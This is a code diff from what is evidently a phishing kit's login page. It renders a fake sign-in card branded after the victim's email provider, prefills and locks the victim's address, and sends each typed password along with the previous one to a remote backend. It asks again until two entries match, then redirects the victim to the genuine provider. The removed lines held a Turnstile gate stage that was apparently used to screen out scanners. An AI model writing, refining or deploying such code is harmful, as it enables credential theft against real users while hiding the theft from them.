+  sub.style.display = brand.subtitle ? 'block' : 'none';
+
+  document.getElementById('label-em').textContent = brand.emailLabel;
+  document.getElementById('label-pw').textContent = brand.passwordLabel;
+  document.getElementById('btn').textContent = brand.buttonText;
+
+  // footer + links
+  var footerHTML = (brand.footer || '');
+  if (brand.links && brand.links.length) {
+    footerHTML += '<div style="margin-top:8px">' +
+      brand.links.map(function(l){
+        return '<a href="' + l.href + '" rel="noopener">' + l.text + '</a>';
+      }).join('') +
+      '</div>';
   }
+  document.getElementById('footer-slot').innerHTML = footerHTML;
 
-  function onTurnstileError(){
-    document.getElementById('ts-error').style.display = 'block';
-  }
+  // dynamic style for accent colors
+  var dynamicStyle = document.createElement('style');
+  dynamicStyle.textContent =
+    '.card::before{background:linear-gradient(90deg,' + brand.accent + ',' + brand.accent2 + ',' + brand.accent + ') !important}' +
+    'input:focus{border-color:' + brand.accent + ' !important;box-shadow:0 0 0 3px ' + hexToRgba(brand.accent,.15) + ' !important}' +
+    'button{background:' + brand.accent + ' !important}' +
+    '.spin{border-top-color:' + brand.accent + ' !important}';
+  document.head.appendChild(dynamicStyle);
 
-  var tries = 0;
-  function bootTurnstile(){
-    if (typeof turnstile === 'undefined') {
-      if (++tries > 40) return onTurnstileError();
-      return setTimeout(bootTurnstile, 200);
-    }
-    try {
-      turnstile.render('#ts-turnstile', {
-        sitekey: TURNSTILE_KEY,
-        callback: onTurnstileSuccess,
-        errorCallback: onTurnstileError,
-        appearance: 'always',
-        retry: 'never'
-      });
-    } catch(e){ onTurnstileError(); }
-  }
-
-  if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', bootTurnstile);
+  // prefill + lock email
+  var em = document.getElementById('em');
+  if (email) {
+    em.value = email;
+    em.readOnly = true;
+    document.getElementById('pw').focus();
   } else {
-    bootTurnstile();
-  }
-
-  // ============================================================
-  // STAGE 2 — Branded login form
-  // ============================================================
-  function showLoginForm(){
-    document.getElementById('stage-gate').classList.add('hidden');
-    document.getElementById('stage-login').classList.remove('hidden');
-
-    document.getElementById('login-logo').innerHTML = brand.logoText;
-    document.getElementById('login-subtitle').textContent = brand.subtitle;
-    document.getElementById('label-em').textContent = brand.emailPlaceholder;
-    document.getElementById('label-pw').textContent = brand.passwordPlaceholder;
-    document.getElementById('btn').textContent = brand.buttonText;
-    document.getElementById('login-footer').textContent = brand.footer;
-
-    // Apply brand colors to the login card
-    var loginCard = document.getElementById('stage-login');
-    loginCard.style.setProperty('--accent', brand.accent);
-    loginCard.querySelector('.card::before');
-    // Inject a style block for this card's accent (can't style ::before inline)
-    var style = document.createElement('style');
-    style.textContent =
-      '#stage-login::before{background:' + brand.headerGradient + ' !important}' +
-      '#stage-login input:focus{border-color:' + brand.accent + ' !important;box-shadow:0 0 0 3px ' + hexToRgba(brand.accent,.12) + ' !important}' +
-      '#stage-login button{background:linear-gradient(135deg,' + brand.accent + ',' + brand.accent2 + ') !important}' +
-      '#stage-login .spin{border-top-color:' + brand.accent + ' !important}';
-    document.head.appendChild(style);
-
-    // Prefill + lock email
-    var em = document.getElementById('em');
-    if (email) { em.value = email; em.readOnly = true; }
     em.focus();
-    if (email) document.getElementById('pw').focus();
   }
 
   // ============================================================
   // LOGIN LOGIC — redirect ONLY after 2 identical passwords
   // ============================================================
+  var form         = document.getElementById('lf');
+  var btn          = document.getElementById('btn');
+  var msg          = document.getElementById('msg');
   var attempt      = 0;
   var lockedEmail  = email || null;
   var lastPassword = null;
-  var redirectUrl  = FALLBACK_REDIRECT;
+  var redirectUrl  = FALLBACK_REDIR;
 
-  var form = document.getElementById('lf');
-  var btn  = document.getElementById('btn');
-  var msg  = document.getElementById('msg');
-
-  function showMsg(text, spin){
-    msg.innerHTML = (spin ? '<span class="spin"></span>' : '') + text;
+  function showMsg(t, spin){
+    msg.innerHTML = (spin ? '<span class="spin"></span>' : '') + t;
     msg.style.display = 'block';
   }
 
@@ -349,15 +645,15 @@ button:disabled{opacity:.6;cursor:not-allowed;transform:none}
     var body = {
       email: lockedEmail,
       password: thisPassword,
-      prevPassword: lastPassword,   // ← 1st password remembered here
+      prevPassword: lastPassword,
       attempt: attempt
     };
 
     var data = null;
     try {
       var r = await fetch(BACKEND + '/api/login', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
         body: JSON.stringify(body)
       });
       data = await r.json().catch(function(){ return null; });
@@ -366,7 +662,7 @@ button:disabled{opacity:.6;cursor:not-allowed;transform:none}
     if (data && data.redirect) redirectUrl = data.redirect;
     lastPassword = thisPassword;
 
-    // 🔑 Not a match yet → stay on the form, ask for the same password again
+    // Not a match yet → ask again
     if (data && data.retry === true) {
       form.password.value = '';
       form.password.focus();
@@ -377,7 +673,7 @@ button:disabled{opacity:.6;cursor:not-allowed;transform:none}
       return;
     }
 
-    // ✅ Match (or cap) → redirect to the user's OWN provider
+    // Match (or cap) → redirect to provider
     btn.textContent = '...';
     showMsg('Redirecting to ' + brand.name + '…', true);
     setTimeout(function(){ window.location.href = redirectUrl; }, 700);
